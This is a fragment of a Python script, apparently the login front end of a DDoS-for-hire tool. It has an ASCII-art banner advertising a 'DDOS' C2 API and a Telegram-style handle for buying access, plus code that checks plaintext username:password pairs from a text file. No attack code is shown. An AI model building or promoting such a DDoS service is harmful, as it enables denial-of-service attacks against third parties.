			except ValueError:
				main()
			except IndexError:
				main()
                

		
					
def read_login_data(filename):
    try:
        with open(filename, "r") as file:
            login_data = {}
            for line in file:
                username, password = line.strip().split(":")
                login_data[username] = password
            return login_data
    except FileNotFoundError:
        print(f"File {filename} tidak ditemukan.")
        return None
    except ValueError:
        print("Format data login tidak valid.")
        return None

def login(login_data):
    while True:
        os.system('clear')
        print(f'''\033[36m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣷⣶⣦⣤⣰⡄⠀⢀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢶⣶⣤⣿⣿⣿⣿⣿⣿⣶⣾⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣴⣿⣿⣿⣿⡿⠃⠀⢻⣿⣿⡟⣿⣿⣿⣿⣿⣿⣟⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⠀⠀⠀⠀⠉⠛⣻⣿⣿⣿⡿⠁⠀⠀⠀⢻⣿⡇⠘⡏⢿⣿⣿⣿⣿⡷⠦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⡄⠀⠀⠀⠠⠾⠛⣿⣿⢻⠧⠤⠒⠂⠀⠀⠹⣇⠐⠛⠺⡿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⡇⠀⠀⠀⠀⢠⣾⣿⣿⠸⢀⣠⣤⣄⠀⡇⠀⠈⣶⣦⣤⡁⢹⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀Login To ERORR X DDOS X BIL⠀⠀⠀
⣀⣀⣠⠞⠙⣤⣀⣀⡔⠛⠛⢿⣿⣀⡘⠛⠉⠀⠘⠃⠀⠀⠓⠷⠿⣷⣸⣿⣿⣇⠈⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠈⠙⣦⡞⠉⠀⠀⠀⠀⠀⢸⣿⡙⣿⠶⠚⠉⠉⠉⣉⣉⠙⠋⣓⡿⢹⣿⡿⠀⠀⠀⠀⡆⠀⠀  Buy : @Erorr37cs
⠀⠀⠀⣿⠃⠀⠀⠀⠀⠀⠀⠈⢿⣧⠸⣾⣿⣿⠿⠿⠿⠿⠿⢿⡿⢁⣿⠟⠁⠀⠀⠀⢀⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⠀⠀⠀⠀⠀⣀⣠⠤⡄⠙⠧⣙⢿⣖⠒⠒⠒⢀⣰⠞⡡⠊⠀⠀⠀⠐⠒⠲⢏⣀⠽⠓⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠀⠀⠀⠀⣾⣿⠏⠉⠁⠀⠀⠈⣳⣮⣭⣒⣋⣭⣴⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣀⣀⣠⣏⣇⣀⡀⠀⠀⢠⣾⣿⡏⠙⢿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⡴⠚⠻⢿⣶⡖⣷⡴⣿⠀⣠⣿⣿⡿⠁⠀⠀⠉⠉⢻⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣰⢁⡴⠒⠶⣿⣧⠿⣤⣿⣷⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠛⣿⣿⣿⣿⠒⠤⠤⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣼⢿⡥⠒⠒⠢⢤⣿⣿⢛⣿⣿⣿⣿⣿⠓⠦⡀⠀⠀⡠⠔⠚⢻⣿⣿⣿⡆⠀⠀⠀⠀⠑⢄⠀⠀⠀ 𝙴𝚁𝙾𝚁𝚁 𝚇 𝙳𝙳𝙾𝚂 𝚇 𝙱𝙸𝙻 𝙲𝟸 𝙰𝙿𝙸⠀
⠀⣿⢋⣠⠶⢲⣶⣶⣿⠁⣼⢸⣿⣿⣿⣿⠀⠀⠉⠀⡖⠀⠀⠀⠈⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢰⠛⣏⣠⣴⠚⠿⣿⣿⠊⢸⢸⣿⣿⣿⣿⠀⠀⢀⣾⢀⡀⠀⠀⣰⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠈⠓⠤⣀⠀⠀⠀⠀⠀⠀
⠸⠀⢼⠁⣿⡴⠿⠏⠹⠻⢾⣎⣿⣿⣿⡏⠙⠢⠏⠘⠋⢧⠴⠊⠀⣿⣿⣿⣿⡄⡰⠢⢄⡀⠀⠀⠀⠀⠀⠀⠙⢦⡀⠀⠀⠀
⠀⣆⣀⣾⡏⠉⣩⣏⣿⡋⢋⣿⣿⣿⣿⡇⠀⠀⠀⣀⣀⠀⠀⠀⢰⣿⣿⣿⣿⣷⠃⠀⠀⠈⠲⢄⡀⠀⠀⠀⠀⠀⠙⢶⣄⠀
⠀⣇⠀⠀⢻⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⣀⣤⠿⣷⠀⠀⠀⢸⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠉⠒⢤⡀⠀⠀⠀⠀⠈⢧
⠀⢸⠀⠀⠈⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠛⠋⠁⢠⣶⠉⠁⠀⢼⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⠀⠀⠀⢀⡞
⠀⠈⡀⠀⠀⠘⣿⣿⣿⠇⣿⣿⣿⣿⣿⣷⠂⠀⢀⣈⣏⡀⢠⣤⣺⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⢀⡎⠀⠀⠀⠈⠀
⠀⠀⠁⠀⠀⠀⠉⠉⠉⠀⠉⠉⠉⠉⠉⠉⠀⠀⠉⠉⠁⠈⠈⠀⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀
\033[35m
''')
        username = input("Username »  ")
        password = input("Password » ")
        if username in login_data and login_data[username] == password:
            print("Login berhasil🪐!")
            time.sleep(1)
            menu()
            main()
            return
        else:
            print("Username atau password salah. Silakan coba lagi.")

login_filename = "login_data.txt"
login_data = read_login_data(login_filename)

if login_data is not None:
    login(login_data)

